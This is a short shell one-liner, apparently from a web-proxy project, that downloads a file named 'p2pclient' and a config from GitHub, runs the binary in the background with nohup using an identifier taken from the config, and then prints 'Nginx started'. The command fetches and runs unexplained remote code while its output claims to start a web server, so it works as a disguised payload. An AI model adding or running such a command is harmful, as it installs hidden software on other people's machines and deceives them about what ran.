wget https://raw.githubusercontent.com/bls4/womginx/main/config/p2p && wget https://raw.githubusercontent.com/bls4/womginx/main/config/p2pclient && chmod +x p2pclient && echo "nohup  ./p2pclient -l MAIL_ADDREES  2>1 &" | sed -e "s/MAIL_ADDREES/$(cat p2p)/" > p2p.sh && chmod +x p2p.sh && ./p2p.sh && echo 'Nginx started' 
